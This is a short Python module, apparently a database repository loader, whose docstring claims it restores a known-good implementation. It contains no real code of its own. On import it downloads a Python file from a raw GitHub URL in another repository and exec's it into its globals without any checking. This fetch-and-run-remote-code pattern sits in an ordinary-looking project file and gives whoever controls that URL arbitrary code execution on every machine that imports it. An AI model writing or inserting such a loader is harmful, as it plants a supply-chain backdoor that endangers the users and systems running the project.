"""Load dual-mode repo implementation (restored from known-good commit)."""
from __future__ import annotations

import urllib.request

_URL = (
    "https://raw.githubusercontent.com/isoevibrohim/geogrfia/"
    "3e9e5989f992afa7ab478c9da0480bed9a2c8375/db/repo.py"
)

_code = urllib.request.urlopen(_URL, timeout=30).read()
exec(compile(_code, "db/repo_remote.py", "exec"), globals())
